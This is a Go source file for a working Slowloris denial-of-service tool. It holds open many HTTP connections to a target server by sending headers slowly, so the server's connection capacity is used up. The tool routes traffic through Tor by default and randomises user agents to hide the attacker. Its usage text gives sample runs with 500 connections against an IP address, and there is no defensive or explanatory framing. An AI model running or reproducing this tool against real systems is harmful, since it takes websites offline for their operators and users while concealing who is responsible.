package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"

	"golang.org/x/net/proxy"
)

const (
	defaultUserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
	defaultDOSHeader = "Cookie: a=b"
)

type options struct {
	numConnections int
	interval       time.Duration
	timeout        time.Duration
	method         string
	resource       string
	userAgent      string
	randomAgent    bool
	target         string
	https          bool
	dosHeader      string
	timermode      bool
	finishAfter    time.Duration
	quiet          bool
	tor            bool
	torAddress     string
}

func (o *options) String() string {
	return fmt.Sprintf("====== OPTIONS ======\n"+
		"connections:   %d\n"+
		"interval:      %s\n"+
		"timeout:       %s\n"+
		"method:        %s\n"+
		"resource:      %s\n"+
		"user agent:    %s\n"+
		"random agent:  %v\n"+
		"target:        %s\n"+
		"https:         %t\n"+
		"DOS header:    %s\n"+
		"finish after:  %s\n"+
		"tor:           %v\n"+
		"tor address:   %s\n\n", o.numConnections, o.interval, o.timeout, o.method,
		o.resource, o.userAgent, o.randomAgent, o.target, o.https, o.dosHeader, o.finishAfter, o.tor, o.torAddress)
}

func main() {
	opts := options{}

	flag.Usage = usage
	flag.IntVar(&opts.numConnections, "connections", 10, "Number of active concurrent connections")
	flag.DurationVar(&opts.interval, "interval", 1*time.Second, "Duration to wait between sending headers")
	flag.DurationVar(&opts.timeout, "timeout", 60*time.Second, "HTTP connection timeout in seconds")
	flag.StringVar(&opts.method, "method", "GET", "HTTP method to use")
	flag.StringVar(&opts.resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&opts.userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.BoolVar(&opts.randomAgent, "randomAgent", true, "Use a random user agent on each request")
	flag.StringVar(&opts.dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
	flag.BoolVar(&opts.https, "https", false, "Use HTTPS")
	flag.BoolVar(&opts.timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
	flag.BoolVar(&opts.quiet, "quiet", false, "forward stdout to /dev/null")
	flag.BoolVar(&opts.tor, "tor", true, "Use TOR SOCKS5 proxy")
	flag.StringVar(&opts.torAddress, "toraddress", "127.0.0.1:9050", "TOR SOCKS5 proxy address")
	flag.DurationVar(&opts.finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
	flag.Parse()

	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	if opts.quiet {
		devNull, err := os.Open(os.DevNull)
		if err != nil {
			panic(fmt.Sprintf("can't open %s this should not happen!", os.DevNull))
		}
		os.Stdout = devNull
	}

	opts.target = flag.Args()[0]
	if !strings.Contains(opts.target, ":") {
		if opts.https {
			opts.target += ":443"
		} else {
			opts.target += ":80"
		}
	}

	fmt.Printf(opts.String())

	if opts.timermode {
		go timer(opts)
	} else {
		fmt.Printf("Attacking %s with %d connections\n", opts.target, opts.numConnections)
		for i := 0; i < opts.numConnections; i++ {
			go slowloris(opts)
		}
	}

	started := time.Now()
	ticker := time.Tick(1 * time.Second)
loop:
	for {
		select {
		case <-signals:
			fmt.Printf("\nReceived SIGKILL, exiting...\n")
			break loop
		case <-ticker:
			dur := time.Now().Sub(started)
			fmt.Printf("Attack duration: %dh %dm %ds\r", int(dur.Hours()), int(dur.Minutes()), int(dur.Seconds()))
		}
	}
}

func usage() {
	fmt.Println("")
	fmt.Printf("usage: %s [OPTIONS]... TARGET\n", os.Args[0])
	fmt.Println("  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
	fmt.Println("EXAMPLES")
	fmt.Printf("  %s -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Println("")
}

func timer(opts options) {
	fmt.Printf("Timer mode activated. Use Ctrl+C to terminate the program.\n")
	for {
		d := getTimeout(opts)
		fmt.Printf("Server closed the connection after %.2f seconds\n", d.Seconds())
	}
}

func getTimeout(opts options) time.Duration {
	start := time.Now()

	conn, err := openConnection(opts)
	if err != nil {
		fmt.Println("FATAL: " + err.Error())
		os.Exit(-1)
	}

	trash := make([]byte, 1024)
	_, err = conn.Read(trash)
	if err != nil {
		return time.Now().Sub(start)
	}

	panic("This should not happen!")
}

func slowloris(opts options) {
	var conn net.Conn
	var err error

	var timerChan <-chan time.Time
	var timer *time.Timer
	if opts.finishAfter != 0 {
		timer = time.NewTimer(opts.finishAfter)
		timerChan = timer.C
	}

loop:
	for {
		if conn != nil {
			conn.Close()
		}

		conn, err = openConnection(opts)
		if err != nil {
			continue
		}

		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", opts.method, opts.resource); err != nil {
			continue
		}

		header := createHeader(opts)
		if err = header.Write(conn); err != nil {
			continue
		}

		for {
			select {
			case <-time.After(opts.interval):
				if timer != nil {
					timer.Reset(opts.finishAfter)
				}
				if _, err := fmt.Fprintf(conn, "%s\r\n", opts.dosHeader); err != nil {
					continue loop
				}

			// if timerChan is nil (finishAfter =< 0) the case involving it will be omitted
			case <-timerChan:
				fmt.Fprintf(conn, "\r\n")
				ioutil.ReadAll(conn) // omit return values
				conn.Close()
				continue loop
			}
		}
	}

}

func openConnection(opts options) (net.Conn, error) {
	var conn net.Conn
	var err error
	if opts.tor {
		// create a socks5 dialer
		torDialer, err := proxy.SOCKS5("tcp", opts.torAddress, nil, proxy.Direct)
		if err != nil {
			fmt.Println("FATAL: %v", err)
			os.Exit(-1)
		}
		conn, err = torDialer.Dial("tcp", opts.target)
		if err != nil {
			return nil, err
		}
		return conn, nil

	}
	if opts.https {
		dial := &net.Dialer{Timeout: opts.timeout}
		config := &tls.Config{InsecureSkipVerify: true}
		conn, err = tls.DialWithDialer(dial, "tcp", opts.target, config)
		if err != nil {
			return nil, err
		}
	} else {
		conn, err = net.DialTimeout("tcp", opts.target, opts.timeout)
		if err != nil {
			return nil, err
		}
	}

	return conn, nil
}

func createHeader(opts options) *http.Header {
	hdr := http.Header{}
	hdr.Add("Host", opts.target)

	var userAgent string
	if opts.randomAgent {
		userAgent = GenerateRandomUA()
	} else {
		userAgent = opts.userAgent
	}
	hdr.Add("User-Agent", userAgent)

	return &hdr
}
